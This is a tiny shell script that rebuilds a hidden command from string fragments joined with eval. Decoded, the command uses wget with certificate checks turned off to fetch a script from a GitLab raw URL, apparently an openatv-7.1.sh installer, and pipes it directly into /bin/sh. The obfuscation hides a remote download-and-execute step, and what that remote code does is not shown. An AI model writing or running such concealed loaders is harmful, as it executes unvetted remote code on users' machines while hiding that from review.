z="
";Jz='/git';Iz='ps:/';Dz='heck';Oz='l1/i';Sz='main';Zz='bin/';cz=' 0';Cz='no-c';Mz='emil';Bz='  --';Kz='lab.';Qz='s/-/';Yz=' | /';Tz='/ope';Az='wget';Vz='-7.1';Uz='natv';Ez='-cer';az='sh';Gz='cate';Lz='com/';Wz='.sh ';Rz='raw/';Nz='nabi';Pz='mage';bz='exit';Hz=' htt';Fz='tifi';Xz='-O -';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"